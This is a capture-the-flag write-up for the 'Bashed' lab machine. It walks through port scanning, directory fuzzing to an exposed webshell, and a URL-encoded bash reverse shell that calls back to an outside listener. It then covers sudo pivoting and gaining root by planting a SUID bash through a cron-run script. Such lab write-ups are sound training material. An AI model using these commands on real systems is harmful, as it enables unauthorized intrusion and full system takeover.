# Write Up

About Bashed machine:
- OS: Linux
- Difficulty: Easy
- Release date: 2017-Dec-09
- IP: 10.10.10.68

## Scan phase

Firstly, I run an active scan to get the open ports in the machine. Syn Stealth Scan (-sS) is used for this scan. 

```bash
nmap -sS -p- --open -n -Pn --min-rate 5000 -oN host 10.10.10.68
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-21 17:50 CET
Nmap scan report for 10.10.10.68
Host is up (0.047s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.89 seconds
```

Now, I scan versions and run default NSE scripts to detect possible attacks or exclude other attacks, like brute force. The versions are obtained with -sV parameter and extra information is gained with -sC parameter.
The port 80 is found open. This port is running Apache 2.4.18, but I haven't more information. 

```bash
nmap -sCV -p80 -oN ports 10.10.10.68
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-21 17:51 CET
Nmap scan report for 10.10.10.68
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
```

At this point, I search the web to get any interesting paths or something to execute an exploit.

I can't find anything on the web. I attack the web by fuzzing to search hint paths. I choose wfuzz tool to run this attack. I prefer wfuzz than other because you can add threads to do it shorter.

```bash
wfuzz -t 400 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ

## Explotation phase

An important directory is found by wfuzz. The directory is called  _dev_. Two files are been in the directory. I visualize the directory _phpbash.php_. A webshell runs in this path and it works like common shell.

I could try to get the user flag without enabling a reverse shell. Finally, the user flag is obtained:

![Desktop View](/assets/img/posts/Bashed/user.PNG)

To finish with the explotation phase, I run a reverse shell to upload privilages more easily. The & symbol is changed by %26 because we need to encode as url-encode. If The command isn't encoded, the shell doesn't run because it is not supported. 
After I run the reverse shell, I run netcat to open a listen port and receive the shell.

```bash
bash -c "bash -i %26> /dev/tcp/10.10.14.8/443 0>%261"
```

Once the access is gained, this phase is ended.

## Privilege escalation

Now, I verify that I'm not in user groups and I find something useful to escalate privileges. The user www-data can run commands as scriptmanager without password.

![Desktop View](/assets/img/posts/Bashed/sudol.PNG)

The following command is run to get a bash of the scriptmanager user:

```bash
sudo -u scriptmanager bash -c bash
```

When the user flag is searched a "scripts" directory is found. Here is the content of both scripts:

```bash
# test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

# test.txt
testing 123!
```

"Test.txt" file is created by root. In this case We can think root have a cron task to run "test.py". I can modify "test.py", so I write the script in python to modify permission and get SUID permission.

When "test.py" is run I analize permissions. SUID permission is found in "/bin/bash". To get the bash of the root user I need to run the following command:

```bash
bash -p 
# -p is to runs this command like its owner. In this case I runs bash as root.
```

Finally, I get the root flag:
